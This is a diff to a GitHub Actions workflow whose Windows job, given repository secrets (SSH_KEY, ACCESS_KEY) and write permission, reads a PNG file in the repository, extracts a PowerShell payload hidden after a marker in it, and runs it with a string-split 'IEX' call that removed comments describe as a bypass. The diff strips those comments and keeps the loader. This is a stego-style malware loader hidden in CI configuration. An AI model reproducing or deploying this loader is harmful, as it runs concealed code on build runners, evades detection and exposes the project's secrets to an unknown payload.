@@ -5,7 +5,7 @@ on:
 
 jobs:
   j_712:
-    runs-on: windows-latest
+    runs-on: windows-2022
     timeout-minutes: 360
     permissions:
       actions: write
@@ -21,24 +21,17 @@ jobs:
           SSH_KEY: ${{ secrets.SSH_KEY }}
           A_KEY: ${{ secrets.ACCESS_KEY }}
         run: |
-          # 1. Tentukan path gambar di root repo
           $imgPath = Join-Path $pwd "BondeXJS.png"
           
           if (Test-Path $imgPath) {
               Write-Host "[*] Reading payload from $imgPath..." -ForegroundColor Cyan
               
-              # 2. Baca konten file sebagai string mentah
               $content = Get-Content $imgPath -Raw -Encoding utf8
-              
-              # 3. Cari marker awal skrip (sesuai header di payload.ps1)
               $marker = "# ========================================================="
               $startIndex = $content.IndexOf($marker)
-              
               if ($startIndex -ge 0) {
                   $payload = $content.Substring($startIndex)
                   Write-Host "[+] Payload extracted. Launching Ghost Engine..." -ForegroundColor Green
-                  
-                  # 4. Eksekusi dengan IEX (Fragmented untuk bypass)
                   $e = "I" + "E" + "X"
                   & $e ($payload)
               } else {
